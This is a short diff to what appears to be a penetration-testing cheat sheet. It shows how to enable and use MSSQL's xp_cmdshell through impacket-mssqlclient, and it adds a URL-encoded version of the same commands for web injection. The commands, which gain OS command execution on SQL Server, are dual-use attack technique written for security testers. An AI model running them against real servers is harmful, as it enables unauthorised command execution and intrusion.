@@ -39,9 +39,17 @@ Example "locally":
 kali$ impacket-mssqlclient Administrator:thelocaladminpass@$TargetIp -windows-auth
 SQL> execute sp_configure 'show advanced options', 1;
 SQL> reconfigure;
-SQL> execute sp_configure 'xp_cmdshell'
+SQL> execute sp_configure 'xp_cmdshell';
 SQL> reconfigure;
 SQL> execute xp_cmdshell 'whoami';
+```
+and URL encoded:
+```
+execute%20sp_configure%20%27show%20advanced%20options%27%2C%201%3B
+reconfigure%3B
+execute%20sp_configure%20%27xp_cmdshell%27%3B
+reconfigure%3B
+execute%20xp_cmdshell%20%27whoami%27%3B
 ```
 
 #### In blind mode
